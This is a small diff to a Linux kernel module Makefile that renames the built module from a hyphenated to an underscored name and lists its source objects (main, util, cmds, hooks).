@@ -20,8 +20,8 @@ EXTRA_CFLAGS += -DSHRK_DEBUG=$(SHRK_DEBUG)             \
                 -DSHRK_CLIENT_ID=\"$(SHRK_CLIENT_ID)\"
 
 # kernel vars cant define with patsubst for some fucking reason
-obj-m := shrk-$(SHRK_CLIENT_ID).o 
-shrk-$(SHRK_CLIENT_ID)-objs := main.o               \
+obj-m := shrk_$(SHRK_CLIENT_ID).o 
+shrk_$(SHRK_CLIENT_ID)-objs := main.o               \
                                util.o               \
                                cmds.o               \
                                hooks.o              \
